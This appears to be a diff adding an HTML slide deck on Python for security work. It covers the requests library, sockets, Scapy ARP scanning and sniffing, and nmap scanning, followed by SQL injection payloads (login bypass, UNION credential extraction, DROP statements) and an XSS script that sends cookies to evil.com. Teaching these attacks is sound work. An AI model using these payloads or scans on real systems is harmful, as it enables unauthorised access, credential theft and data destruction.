+text/html; charset=UTF-8
+"""
+
+# req.json() # For json encoding
+# [{'repository': {'open_issues': 0, 'url': 'https://edureka.co/...
+# req.text # If the content you are accessing is text
+# '[{"repository":{"open_issues":0,"url":"https://edureka.co/...
+# req.raw.read(10) # get the raw response 10 bytes
+# print(req.headers)
+"""
+{
+    'content-encoding': 'gzip',
+    'transfer-encoding': 'chunked',
+    'connection': 'close',
+    'server': 'nginx/1.0.4',
+    'x-runtime': '148ms',
+    'etag': '"e1ca502697e5c9317743dc078f67693f"',
+    'content-type': 'application/json'
+}
+"""
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Requests with GET request</h2>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+ 
+query = {'q': 'Forest', 'order': 'popular', 'min_width': '800', 'min_height': '600'}
+req = requests.get('https://pixabay.com/en/photos/', params=query)
+ 
+req.url
+# returns 'https://pixabay.com/en/photos/?order=popular_height=600&q=Forest&min_width=800'
+
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Requests with POST request</h2>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+req = requests.post('https://en.wikipedia.org/w/index.php', data = {'search':'Nanotechnology'})
+req.raise_for_status()
+with open('Nanotechnology.html', 'wb') as fd:
+	for chunk in req.iter_content(chunk_size=50000):
+		fd.write(chunk)
+
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Requests send JSON</h2>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+import json
+
+url = 'https://api.github.com/some/endpoint'
+payload = {'some': 'data'}
+
+r = requests.post(url, data=json.dumps(payload))
+# r = requests.post(url, json=payload) # added in version 2.4.2
+# Using the json parameter in the request will change the Content-Type in the header to application/json.
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>POST a Multipart-Encoded File</h2>
+						<p><small>Requests makes it simple to upload Multipart-encoded files</small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+url = 'https://httpbin.org/post'
+files = {'file': open('report.xls', 'rb')}
+
+r = requests.post(url, files=files)
+print(r.text)
+
+"""
+{
+  ...
+  "files": {
+    "file": "&lt;censored...binary...data&gt;"
+  },
+  ...
+}
+"""
+# You can set the filename, content_type and headers explicitly
+
+url = 'https://httpbin.org/post'
+files = {'file': ('report.xls', open('report.xls', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}
+
+r = requests.post(url, files=files)
+print(r.text)
+"""
+{
+  ...
+  "files": {
+    "file": "&lt;censored...binary...data&gt;"
+  },
+  ...
+}
+"""
+						</code></pre>
+					</section>					
+					
+					<section>
+						<h2>Requests stream data or Downloading</h2>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+req = requests.get('path/to/forest.jpg', stream=True)
+req.raise_for_status() # If we made a bad request (a 4XX client error or 5XX server error response), we can raise it with 
+with open('Forest.jpg', 'wb') as fd:
+	for chunk in req.iter_content(chunk_size=50000): # bytes
+		print('Received a Chunk')
+		fd.write(chunk)
+
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>How to Insert Headers & Cookies in a Request?</h3>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+ 
+url = 'http://some-domain.com/set/cookies/headers'
+ 
+headers = {'user-agent': 'your-own-user-agent/0.0.1'}
+cookies = {'visit-month': 'February'}
+ 
+req = requests.get(url, headers=headers, cookies=cookies)
+
+print(req.cookies['visit-month'])
+# 'February'
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Cookie jar can also store cookies</h2>
+						<p><small>They provide a more complete interface to allow you to use those cookies over multiple paths.</small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+ 
+jar = requests.cookies.RequestsCookieJar()
+jar.set('first_cookie', 'first', domain='httpbin.org', path='/cookies')
+jar.set('second_cookie', 'second', domain='httpbin.org', path='/extra')
+jar.set('third_cookie', 'third', domain='httpbin.org', path='/cookies')
+ 
+url = 'http://httpbin.org/cookies'
+req = requests.get(url, cookies=jar)
+ 
+req.text
+ 
+# returns '{ "cookies": { "first_cookie": "first", "third_cookie": "third" }}'
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Session Objects</h2>
+						<p><small>Sessions are also helpful when you want to send the same data across all requests. For example, if you decide to send a cookie or a user-agent header with all the requests to a given domain, you can use Session objects.</small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+ 
+ssn = requests.Session()
+ssn.cookies.update({'visit-month': 'February'})
+ 
+reqOne = ssn.get('http://httpbin.org/cookies')
+print(reqOne.text)
+# prints information about "visit-month" cookie
+ 
+reqTwo = ssn.get('http://httpbin.org/cookies', cookies={'visit-year': '2017'})
+print(reqTwo.text)
+# prints information about "visit-month" and "visit-year" cookie
+ 
+reqThree = ssn.get('http://httpbin.org/cookies')
+print(reqThree.text)
+# prints information about "visit-month" cookie
+
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Custom Headers</h2>
+						<p><small>If you’d like to add HTTP headers to a request, simply pass in a <span class="GoldenYellow">dict</span> to the <span class="CornflowerBlue">headers</span> parameter.</small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+ 
+url = 'https://api.github.com/some/endpoint'
+headers = {'user-agent': 'my-app/0.0.1'}
+
+r = requests.get(url, headers=headers)
+
+						</code></pre>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>socket</h2>
+						<p>Socket acts on two parts: <span class="GoldenYellow">IP Address</span> + <span class="GoldenYellow">Port Number</span></p>
+						<p class="CornflowerBlue">with</p>
+						<p>two sides: <span class="GoldenYellow">Client</span>(Attaker) + <span class="GoldenYellow">Server</span>(victim)</p>
+						<p style="font-size:30px">s = socket.socket (<span class="GoldenYellow">socket_family</span>, <span class="GoldenYellow">socket_type</span>, <span class="GoldenYellow">protocol=0</span>)</p>
+						<ul>
+							<li style="font-size:30px"><span class="GoldenYellow">socket_family</span>: This is either <span class="CornflowerBlue">AF_UNIX</span> or <span class="CornflowerBlue">AF_INET</span>, as explained earlier</li>
+							<li style="font-size:30px"><span class="GoldenYellow">socket_type</span>: This is either <span class="CornflowerBlue">SOCK_STREAM</span> or <span class="CornflowerBlue">SOCK_DGRAM</span></li>
+							<li style="font-size:30px"><span class="GoldenYellow">protocol</span>: This is usually left out, defaulting to <span class="CornflowerBlue">0</span></li>
+						</ul>
+					</section>
+					
+					<section>
+						<h2>socket</h2>
+						<p>Server Socket Methods</p>
+						<ul>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">s.bind()</span>: binds address (<span class="CornflowerBlue">hostname</span>, <span class="CornflowerBlue">port number pair</span>) to socket</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">s.listen()</span>: This method sets up and start TCP/UDP listener</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">s.accept()</span>: This passively accept client connection, waiting until connection arrives</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h2>socket</h2>
+						<p>Client Socket Methods</p>
+						<ul>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">s.connect()</span>: This method actively initiates server connection</li>
+						</ul>
+						<p>General Socket Methods</p>
+						<ul>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">s.recv()</span>: This method receives TCP message</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">s.send()</span>: This method transmits TCP message</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">s.recvfrom()</span>: This method receives UDP message</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">s.sendto()</span>: This method transmits UDP message</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">s.close()</span>: This method closes socket</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">socket.gethostname()</span>: Returns the hostname</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h2>socket</h2>
+						<p>Socket Client</p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import socket
+
+HOST = '127.0.0.1'  # The server's hostname or IP address
+PORT = 65432        # The port used by the server
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    s.sendall(b'Hello, world')
+    data = s.recv(1024)
+
+print('Received', repr(data)) 
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>socket</h2>
+						<p>Socket Server</p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import socket
+
+HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
+PORT = 65432        # Port to listen on (non-privileged ports are > 1023)
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen()
+    conn, addr = s.accept()
+    with conn:
+        print('Connected by', addr)
+        while True:
+            data = conn.recv(1024)
+            if not data:
+                break
+            conn.sendall(data)
+						</code></pre>
+					</section>
+				</section>
+
+				
+				<section>
+					<section>
+						<h2>Scapy</h2>
+						<p><small>Scapy is a powerful interactive packet manipulation program. It is able to <span class="GoldenYellow">forge</span> or <span class="GoldenYellow">decode packets</span> of a wide number of protocols, send them on the wire, <span class="GoldenYellow">capture them</span>, <span class="GoldenYellow">match requests</span> and <span class="GoldenYellow">replies</span>, and much more. It can easily handle most classical tasks like <span class="GoldenYellow">scanning</span>, <span class="GoldenYellow">tracerouting</span>, <span class="GoldenYellow">probing</span>, unit tests, <span class="GoldenYellow">attacks</span> or <span class="GoldenYellow">network discovery</span>(it can replace <span class="CornflowerBlue">hping</span>, 85% of <span class="CornflowerBlue">nmap</span>, <span class="CornflowerBlue">arpspoof</span>, <span class="CornflowerBlue">arp-sk</span>, <span class="CornflowerBlue">arping</span>, <span class="CornflowerBlue">tcpdump</span>, <span class="CornflowerBlue">tethereal</span>, <span class="CornflowerBlue">p0f</span>, etc.).</small></p>
+						<p>pip3 install <span class="GoldenYellow">scapy-python3</span></p>
+					</section>
+					
+					<section>
+						<h2>creating Network scanner</h2>
+						<p>ARP()</p>
+						<p><small>This function defined in scapy module which allows us to create ARP packets (<span class="GoldenYellow">request</span> or <span class="GoldenYellow">response</span>). By default, if we are calling it, it will create an ARP request packet for us.</small></p>
+						<pre><code class="hljs python">import scapy.all as scapy  
+request = scapy.ARP()</code></pre>
+						<img width="240" height="300" src="./images/IP-Layers-Protocol.jpg"/>
+					</section>
+					
+					<section>
+						<h2>status of the packet</h2>
+						<p>summary()</p>
+						<p><small>This method provide us the status of the packet that we have created. It does not provide the detailed information about the packet, it just gives us the basic idea like what is the type of packet, what is the destination of the packet etc.</small></p>
+						<pre><code class="hljs python">
+import scapy.all as scapy 
+
+request = scapy.ARP() 
+print(request.summary())
+###output:
+ARP who has 0.0.0.0 says 192.168.100.214 
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>gives more detailed information</h2>
+						<p>show()</p>
+						<p><small>This method is very similar to <span class="GoldenYellow">summary()</span> method. It gives more detailed information about the packet. The usage of this function is also much similar to as <span class="GoldenYellow">summary()</span> method.</small></p>
+						<pre><code class="hljs python">
+import scapy.all as scapy 
+
+request = scapy.ARP() 
+print(request.show()) 
+						</code></pre>
+						<img width="369" height="200" src="./images/scapy_arp_show.png"/>
+					</section>
+					
+					<section>
+						<h2>list of available fields</h2>
+						<p>ls()</p>
+						<p><small>This method is present in the scapy class. By using this method, we can see what are the fields that we can set for a specific packet.In our example we will create an <span class="GoldenYellow">ARP</span> packet and the with the help of <span class="GoldenYellow">ls()</span> function, we will see what are the available fields for this packet.</small></p>
+						<pre><code class="hljs python">
+import scapy.all as scapy 
+
+request = scapy.ARP() 
+print(scapy.ls(scapy.ARP()))
+						</code></pre>
+						<img width="455" height="180" src="./images/scapy_arp_ls.png"/>
+					</section>
+					
+					<section>
+						<h2>Steps for creating Network Scanner</h2>
+						<ol>
+							<li style="font-size:20px">Create an ARP packet using <span class="GoldenYellow">ARP()</span> method.</li>
+							<li style="font-size:20px">Set the network range using variable.</li>
+							<li style="font-size:20px">Create an Ethernet packet using <span class="GoldenYellow">Ether()</span> method.</li>
+							<li style="font-size:20px">Set the destination to broadcast using variable hwdst.</li>
+							<li style="font-size:20px">Combine ARP request packet and Ethernet frame using ‘<span class="GoldenYellow">/</span>’.</li>
+							<li style="font-size:20px">Send this to your network and capture the response from different devices.</li>
+							<li style="font-size:20px">Print the IP and MAC address from the response packets.</li>
+						</ol>
+						<pre><code class="hljs python">import scapy.all as scapy 
+
+request = scapy.ARP() 
+
+request.pdst = '192.168.1.1/24, 172.16.5.1/16'
+broadcast = scapy.Ether() 
+
+broadcast.dst = 'ff:ff:ff:ff:ff:ff'
+
+request_broadcast = broadcast / request 
+clients = scapy.srp(request_broadcast, timeout = 1)[0] 
+for element in clients: 
+	print(element[1].psrc + "	 " + element[1].hwsrc)
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>scapy output network</h2>
+						<img src="./images/scapy-outputnetwork.png"/>
+					</section>
+					
+					<section>
+						<h2>Scapy Basic Functions</h2>
+						<ul>
+							<li style="font-size:35px"><span class="GoldenYellow">ls()</span>: list of available layers</li>
+							<li style="font-size:35px"><span class="GoldenYellow">explore()</span>: graphical interface to display existing layers</li>
+							<li style="font-size:35px"><span class="GoldenYellow">lsc()</span>: available functions</li>
+							<li style="font-size:35px"><span class="GoldenYellow">help()</span>: help menu</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h2>Scapy function group, the most common</h2>
+						<ul>
+							<li style="font-size:35px"><span class="GoldenYellow">send()</span>: send packets to level 2</li>
+							<li style="font-size:35px"><span class="GoldenYellow">sendp()</span>: send packets to level 3</li>
+							<li style="font-size:35px"><span class="GoldenYellow">sr()</span>: send and receive packets at level 3</li>
+							<li style="font-size:35px"><span class="GoldenYellow">srp()</span>: send and receive packets at level 2</li>
+							<li style="font-size:35px"><span class="GoldenYellow">sr1()</span>: send and receive only the first packet at level 3</li>
+							<li style="font-size:35px"><span class="GoldenYellow">srp1()</span>: sends and receives only the first packet to level 2</li>
+							<li style="font-size:35px"><span class="GoldenYellow">sniff()</span>: packet sniffing</li>
+							<li style="font-size:35px"><span class="GoldenYellow">traceroute()</span>: command trace route</li>
+							<li style="font-size:35px"><span class="GoldenYellow">arping()</span>: Send who-has ARP requests to determine which machines are up in the network</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h2>Scapy function sr1 Example(layer 3 icmp)</h2>
+						<img src="./images/scapy-sr1-layer2-icmp.jpg"/>
+					</section>
+					
+					<section>
+						<h2>Scapy function sr1 showing(layer 3 icmp)</h2>
+						<img src="./images/scapy-sr1_show-layer2-icmp.jpg"/>
+					</section>
+					
+					<section>
+						<h2>Scapy sniff for 10 packets</h2>
+						<pre><code class="hljs python">#! /usr/bin/env python
+from scapy.all import *
+a=sniff(count=10)
+a.nsummary()
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Scapy sending of packets as message ICMP</h2>
+						<pre><code class="hljs python">#! /usr/bin/env python
+from scapy.all import *
+send(IP(dst="1.2.3.4")/ICMP())
+sendp(Ether()/IP(dst="1.2.3.4",ttl=(1,4)), iface="eth1")
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Scapy commands for sending and receiving packets</h2>
+						<p><small>sr() and sr1() are for layer 3 packets only. If you wish to send and receive layer 2 packets, you must use srp() or srp1().</small></p>
+						<pre><code class="hljs python">#! /usr/bin/env python
+from scapy.all import *
+ans,unans=sr(IP(dst="192.168.86.130",ttl=5)/ICMP())
+ans.nsummary()
+unans.nsummary()
+p=sr1(IP(dst="192.168.86.130")/ICMP()/"Your Message")
+p.show()
+						</code></pre>
+					</section>
+				</section>
+
+				<section>
+					
+					<section>
+						<h2>What is Nmap(Network Mapper)</h2>
+						<p>Nmap is written in <span class="GoldenYellow">C</span> and <span class="GoldenYellow">LUA</span> programming languages, and can be easily integrated into Python</p>
+						<p>Some of the useful Nmap features include:</p>
+						<ul>
+							<li style="font-size:30px"><span class="CornflowerBlue">Host Discovery</span></li>
+							<li style="font-size:30px"><span class="CornflowerBlue">Port Scanning</span></li>
+							<li style="font-size:30px"><span class="CornflowerBlue">Version Detection</span></li>
+							<li style="font-size:30px"><span class="CornflowerBlue">OS Detection</span></li>
+							<li style="font-size:30px"><span class="CornflowerBlue">Scriptable Interaction with the target</span></li>
+						</ul>
+					</section>
+					<section>
+						<h2>Nmap</h2>
+						<ul>
+							<li style="font-size:30px">Run, <span class="GoldenYellow">sudo apt-get install nmap</span> for Linux</li>
+							<li style="font-size:30px">For Windows and Mac OS X, download and install Nmap: <a href="https://nmap.org/download.html" target="_blank">https://nmap.org/download.html</a></li>
+							<li style="font-size:30px">Use the command, <span class="GoldenYellow">pip3 install python-nmap</span></li>
+							<li style="font-size:30px">Or install by downloading the package from <a href="http://xael.org/pages/python-nmap-en.html" target="_blank">here</a></li>
+						</ul>
+					</section>
+					<section>
+						<h2>Using Nmap in Python script</h2>
+						<pre><code class="hljs python">
+>>> import nmap
+>>> nmScan = nmap.PortScanner()
+>>> scan_range = nmScan.scan(hosts="192.168.0.28")
+# scan_range = nmScan.scan(hosts="192.168.0.28 192.168.0.1 192.168.0.2"
+# scan_range = nmScan.scan(hosts="192.168.0.1-10")
+# scan_range = nmScan.scan(hosts="192.168.0.1/24") # 192.168.0.1 to 192.168.0.255
+>>> print (scan_range['scan'])
+# {'tcp': {22: {'state': 'open', 'reason': 'syn-ack', 'name': 'ssh', 'product': 'OpenSSH', 'version': '7.9p1 Raspbian 10+deb10u2', 'extrainfo': 'protocol 2.0', 'conf': '10', 'cpe': 'cpe:/o:linux:linux_kernel'}}}
+>>> nmScan.scan('127.0.0.1', '21-443')
+>>> nmScan.command_line()
+# 'nmap -oX - -p 21-443 -sV 127.0.0.1'
+>>> nmScan.scaninfo()
+{'tcp': {'services': '22-443', 'method': 'connect'}}
+>>> nmScan.all_hosts()
+['127.0.0.1']
+>>> nmScan['127.0.0.1'].hostname()
+'localhost'
+>>> nmScan['127.0.0.1'].state()
+'up'
+>>> nmScan['127.0.0.1'].all_protocols()
+['tcp']
+>>> nmScan['127.0.0.1']['tcp'].keys()
+[80, 25, 443, 22, 111]
+>>> nmScan['127.0.0.1'].has_tcp(22)
+True
+>>> nmScan['127.0.0.1'].has_tcp(23)
+False
+						</code></pre>
+					</section>
+
+				</section>
+
+				<section>
+					<section>
+					<h2>selenium</h2>
+					</section>
+				</section>
+
+				<section>
+					<section>
+					<h2>beautifulsoup</h2>
+					</section>
+				</section>
+
+				<section>
+					<section>
+						<h2>SQL Injection</h2>
+						<p><small>A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete).</small></p>
+						<ul>
+							<li class="">Retrieving hidden data</li>
+							<li class="">Subverting application logic</li>
+							<li class="">UNION attacks</li>
+							<li class="">Examining the database</li>
+							<li class="">Blind SQL injection</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h2>SQL Injection</h2>
+						<p class="GoldenYellow">Retrieving hidden data - Dirty SQL Injection</p>
+						<pre><code class="hljs sql">
+https://insecure-website.com/products?category=Gifts
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+						</code></pre>
+						<p class="CornflowerBlue">To</p>
+						<pre><code class="hljs sql">
+https://insecure-website.com/products?category=Gifts'--
+https://insecure-website.com/products?category=Gifts'+OR+1=1--
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
+-- (SM) 
+DROP sampletable;-- 
+# (M) 
+DROP sampletable;#
+/*Comment Here*/ (SM)
+/*! MYSQL Special SQL */ (M) 
+SELECT /*!32302 1/0, */ 1 FROM tablename
+--Will throw a division by 0 error if MySQL version is higher than3.23.02
+
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>SQL Injection</h2>
+						<p class="GoldenYellow">Subverting application logic</p>
+						<pre><code class="hljs sql">
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+						</code></pre>
+						<p class="CornflowerBlue">To</p>
+						<pre><code class="hljs sql">
+SELECT * FROM users WHERE username = 'administrator'--' AND password = '' 
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>SQL Injection</h2>
+						<p class="GoldenYellow">UNION attacks</p>
+						<pre><code class="hljs sql">
+SELECT name, description FROM products WHERE category = 'Gifts'
+SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members 
+						</code></pre>
+						<p class="CornflowerBlue">To</p>
+						<pre><code class="hljs sql">
+' UNION SELECT username, password FROM users-- 
+' ORDER BY 1--
+' ORDER BY 2--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>SQL Injection</h2>
+						<p class="GoldenYellow">Stacking Queries</p>
+						<img src="./images/second-order-sql-injection.svg" />
+					</section>
+					
+					<section>
+						<h2>SQL Injection</h2>
+						<p class="GoldenYellow">SQL injection in different parts of the query</p>
+						<p>Executing more than one query in one transaction</p>
+						<pre><code class="hljs sql">
+; (MS) 
+SELECT * FROM members; DROP members--
+ID: 10;DROP members --
+SELECT * FROM products WHERE id = 10; DROP members--
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>SQL Injection</h2>
+						<p class="GoldenYellow">Blind SQL injection</p>
+						<pre><code class="hljs sql">
+MySQL If Statement
+
+    IF(condition,true-part,false-part) (M) 
+    SELECT IF(1=1,'true','false')
+
+SQL Server If Statement
+
+    IF condition true-part ELSE false-part (S) 
+    IF (1=1) SELECT 'true' ELSE SELECT 'false'
+
+Oracle If Statement
+
+    BEGIN
+    IF condition THEN true-part; ELSE false-part; END IF; END; (O) 
+    IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;
+
+PostgreSQL If Statement
+
+    SELECT CASE WHEN condition THEN true-part ELSE false-part END; (P) 
+    SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;
+
+If Statement SQL Injection Attack Samples
+
+if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0 (S) 
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>SQL Injection</h2>
+						<p class="GoldenYellow">Bypassing Login Screens (SMO+)</p>
+						<pre><code class="hljs sql">
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+Login as different user (SM*) :
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+						</code></pre>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Cross-site Scripting (XSS)</h2>
+						<p><small>Cross-site Scripting (XSS) is a client-side code injection attack.</small></p>
+						<ul>
+							<li style="text-align: justify;font-size:30px">Malicious JavaScript has access to all the objects that the rest of the web page has access to.</li>
+							<li style="text-align: justify;font-size:30px">JavaScript can read the browser DOM and make arbitrary modifications to it.</li>
+							<li style="text-align: justify;font-size:30px">JavaScript can use the <span class="GoldenYellow">XMLHttpRequest</span> object to send HTTP requests with arbitrary content to arbitrary destinations.</li>
+							<li style="text-align: justify;font-size:30px">JavaScript in modern browsers can use HTML5 APIs. For example, it can gain access to the user’s geolocation, webcam, microphone, and even specific files from the user’s file system. Most of these APIs require user opt-in, but the attacker can use social engineering to go around that limitation.</li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>The consequences of malicious JS</h2>
+						<p><small>Among many other things, the ability to execute arbitrary JavaScript in another user's browser allows an attacker to perform the following types of attacks:</small></p>
+						<ul>
+							<li style="margin-bottom:15px"><span class="GoldenYellow">Cookie theft</span><small>The attacker can access the victim's cookies associated with the website using document.cookie, send them to his own server, and use them to extract sensitive information like session IDs.</small></li>
+							<li style="margin-bottom:15px"><span class="GoldenYellow">Keylogging</span><small>The attacker can register a keyboard event listener using addEventListener and then send all of the user's keystrokes to his own server, potentially recording sensitive information such as passwords and credit card numbers.</small></li>
+							<li><span class="GoldenYellow">Phishing</span><small>The attacker can insert a fake login form into the page using DOM manipulation, set the form's action attribute to target his own server, and then trick the user into submitting sensitive information.</small></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Types of XSS</h2>
+						<p><small>Criminals often use XSS to steal cookies. This allows them to impersonate the victim. The attacker can send the cookie to their own server in many ways. One of them is to execute the following client-side script in the victim’s browser:</small></p>
+						<ul>
+							<li style="margin-bottom:35px"><span class="GoldenYellow">Persistent or Stored XSS</span><small>where the malicious string originates from the website's database.</small></li>
+							<li style="margin-bottom:35px"><span class="GoldenYellow">Reflected XSS</span><small>where the malicious string originates from the victim's request.</small></li>
+							<li><span class="GoldenYellow">DOM-based XSS</span><small>where the vulnerability is in the client-side code rather than the server-side code.</small></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Stealing Cookies Using XSS</h2>
+						<p><small>Criminals often use XSS to steal cookies. This allows them to impersonate the victim. The attacker can send the cookie to their own server in many ways. One of them is to execute the following client-side script in the victim’s browser:</small></p>
+						<pre><code class="hljs html">
+&lt;script&gt;
+window.location="http://evil.com/?cookie=" + document.cookie
+&lt;/script&gt;
+						</code></pre>
+					</section>
+
+					<section>
+						<h2>Persistent or Stored XSS</h2>
+						<p><small>In this type of attack, the malicious code or script is being saved on the web server (<span class="GoldenYellow">For example</span>: <span class="CornflowerBlue">in the database by comment field or review field</span>) and executed every time when the users will call the appropriate functionality. This way stored XSS attack can affect many users. Also as the script is being stored on the web server, it will affect the website for a longer time.</small></p>
+						<img width="604" height="356" src="./images/persistent-xss.png"/>
+					</section>
+
+					<section>
+						<h2>Reflected XSS</h2>
+						<p><small>In a reflected XSS attack, the malicious string is part of the victim's request to the website. The website then includes this malicious string in the response sent back to the user.(<span class="GoldenYellow">For example</span>: <span class="CornflowerBlue">form login page</span>)</small></p>
+						<img src="./images/reflected-xss.png"/>
+					</section>
+
+					<section>
+						<h2>DOM-based XSS</h2>
+						<p><small>DOM-based XSS is a variant of both persistent and reflected XSS. In a DOM-based XSS attack, the malicious string is not actually parsed by the victim's browser until the website's legitimate JavaScript is executed</small></p>
+						<img width="602" height="376" src="./images/dom-based-xss.png"/>
+					</section>
+
+					<section>
+						<h2>Methods of preventing XSS (S1)</h2>
+						<p><small>Recall that an XSS attack is a type of code injection: user input is mistakenly interpreted as malicious program code. In order to prevent this type of code injection, secure input handling is needed. For a web developer, there are two fundamentally different ways of performing secure input handling:</small></p>
+						<ul>
+							<li style="margin-bottom:35px"><span class="GoldenYellow">Encoding</span><small>which escapes the user input so that the browser interprets it only as data, not as code. <code class="hljs html">&amplt;script&ampgt;...&amplt;/script&ampgt; => &lt;script&gt;...&lt;/script&gt;</code></small></li>
+							<li style="margin-bottom:35px"><span class="GoldenYellow">Validation</span><small>which filters the user input so that the browser interprets it as code without malicious commands.</small></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Methods of preventing XSS (S2)</h2>
+						<ul>
+							<li style="margin-bottom:35px"><span class="GoldenYellow">Context</span><small>Secure input handling needs to be performed differently depending on where in a page the user input is inserted.</small></li>
+							<li style="margin-bottom:35px"><span class="GoldenYellow">Inbound/outbound</span><small>Secure input handling can be performed either when your website receives the input (inbound) or right before your website inserts the input into a page (outbound).</small></li>
+							<li style="margin-bottom:35px"><span class="GoldenYellow">Client/server</span><small>Secure input handling can be performed either on the client-side or on the server-side, both of which are needed under different circumstances.</small></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Cross-Site Scripting (XSS) Cheat Sheet</h2>
+						<p><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS Filter Evasion Cheat Sheet by owasp.org </a></p>
+					
+						<h2>Cross-Site Scripting (XSS) attacks</h2>
+						<p><a href="https://owasp.org/www-community/attacks/xss/">How to Review Code for Cross-site scripting Vulnerabilities by owasp.org </a></p>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>For to be Experting !!!</h2>
+						<p>Call Me :)</p>
+						<p class="highlight-green">@FreezeMan</p>
+					</section>
+				</section>
+
+				<section style="text-align: left;">
+					<h1>THE END</h1>
+					<p>
+						<div>- Thank you for watching</div>
+						<div>- Please Traning and continue</div>
+					</p>
+				</section>
+
+			</div>
+
+		</div>
+
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// More info https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				// Display presentation control arrows
+				controls: true,
+				// Determines where controls appear, "edges" or "bottom-right"
+				controlsLayout: 'bottom-right',
+				// Help the user learn the controls by providing hints, for example by
+				// bouncing the down arrow when they first encounter a vertical slide
+				controlsTutorial: true,
+				// Visibility rule for backwards navigation arrows; "faded", "hidden" or "visible"
+				controlsBackArrows: 'faded',
+				// Display a presentation progress bar
+				progress: true,
+				// Display the page number of the current slide
+				slideNumber: false,
+				center: true,
+				// Add the current slide number to the URL hash so that reloading the
+				// page/copying the URL will return you to the same slide
+				hash: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// More info https://github.com/hakimel/reveal.js#dependencies
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js' },
+					{ src: 'plugin/search/search.js', async: true },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
